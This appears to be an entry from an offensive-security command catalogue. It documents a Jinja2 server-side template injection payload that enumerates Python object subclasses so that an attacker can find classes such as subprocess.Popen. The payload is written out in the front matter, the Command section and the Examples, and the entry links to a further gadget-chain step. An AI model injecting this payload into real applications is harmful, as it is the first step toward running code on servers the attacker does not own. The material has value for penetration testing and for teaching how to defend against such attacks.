---
data: '{{ ''''.__class__.__mro__[1].__subclasses__() }}'
tags:
  - gadget-chain
type: command
output: List of subclasses
executor: python
platforms:
  - Python
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:37.002Z'
id: 414a0a0d-a456-444b-ae6a-88da954a8d1b
verified: false
validated: true
submitted: true
---
# jinja2-enumerate-subclasses

## Command

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

## Description

Jinja2 expression to list all subclasses of object, exposing runtime classes for SSTI exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Introspection chain | Yes |

## Examples

### Basic Usage

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

## Expected Output

String representation of class list, e.g., '[<class ...>, ..., <class 'subprocess.Popen'>]'

## Related

- [[commands/jinja2-verify-class-name]]
